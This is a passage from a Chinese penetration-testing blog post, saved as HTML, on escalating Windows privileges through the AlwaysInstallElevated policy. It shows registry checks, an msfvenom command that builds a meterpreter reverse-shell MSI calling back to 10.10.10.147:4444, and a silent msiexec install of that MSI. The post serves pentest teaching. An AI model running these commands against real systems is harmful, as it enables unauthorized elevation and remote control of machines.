+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327231001600.png" alt="image-20240327231001600" class="lazyload"></p>
+<h2><span id="chuang-jian-e-yi-msi-bing-an-zhuang">创建恶意MSI并安装</span><a href="#chuang-jian-e-yi-msi-bing-an-zhuang" class="header-anchor">#</a></h2><p>确定目标系统存在该漏洞后，使用MetaSploit自动生成MSI</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.147 LPORT=4444 -f msi -o reverse_tcp.msi<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327231406326.png" alt="image-20240327231406326" class="lazyload"></p>
+<p>在现有的 Meterpreter 会话中将创建的MSI文件上传到目标计算机，执行以下命令:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">msiexec /quiet /qn /i reverse_tcp.msi<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/quiet，在安装期间禁止向用户发送任何消息；/qn，无GUI模式允许；/i，常规安装</span><br></code></pre></td></tr></table></figure>
+
+<p>最终提权如下：</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240327231615328.png" alt="image-20240327231615328" class="lazyload"></p>
+<h1><span id="fang-wen-ling-pai-cao-zong">访问令牌操纵</span><a href="#fang-wen-ling-pai-cao-zong" class="header-anchor">#</a></h1>
+	</article>
+
+	 
+    <div class="kira-post-copyright">
+        <strong>Author：</strong>clown<br>
+        <strong>Link：</strong><a href="https://clowsman.github.io/2024/03/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="https:&#x2F;&#x2F;clowsman.github.io&#x2F;2024&#x2F;03&#x2F;26&#x2F;内网渗透体系建设-权限提升&#x2F;" target="_blank" rel="noopener">https:&#x2F;&#x2F;clowsman.github.io&#x2F;2024&#x2F;03&#x2F;26&#x2F;内网渗透体系建设-权限提升&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+  
+	<div class="kira-post-nav">
+		<nav class="post-nav">
+			                                      
+			<!-- 先找到与当前文字相同的目录 -->
+			            
+			<!-- 在找到当前文章所在的 index -->
+			            
+			<!-- 上一篇文章 -->
+			<div class="old">
+				<span>上一章</span>
+				<a href="/2024/03/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C%E4%BB%A3%E7%90%86/"> 内网渗透体系建设-端口转发和代理</a>
+			</div>
+			                      
+		</nav>
+	</div>
+	
+	<div class="kira-post-meta kira-rainbow">
+		
+			<a class="kirafont icon-container-fill -link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+		
+		
+			<a class="kirafont icon-tag-fill -none-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+		
+	</div>
+	
+		<script src="/js/kira-code-copy.js"></script>
+	
+	
+	<div class="kira-post-footer">
+		
+
+		
+	<div class="giscus"></div>
+  
+    <script src="https://giscus.app/client.js"
+      data-repo="ch1ny/ch1ny.github.io"
+      data-repo-id="R_kgDOHGgizw"
+      data-category="General"
+      data-category-id="DIC_kwDOHGgiz84CU88t"
+      data-mapping="pathname"
+      data-strict="0"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="light"
+      data-lang="en"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async  
+    ></script>
+  
+
+	</div>
+	
+</div>
+
+				</div>
+			</div>
+			<div class="kira-right-column">
+	<a onclick="document.querySelector('#kira-top-header').scrollIntoView({behavior: 'smooth'});" class="kira-backtotop" aria-label="回到顶部" title="回到顶部">
+		<button class="mdui-fab mdui-ripple">
+			<i class="kirafont icon-caret-up"></i>
+		</button>
+	</a>
+</div>
+
+		</div>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
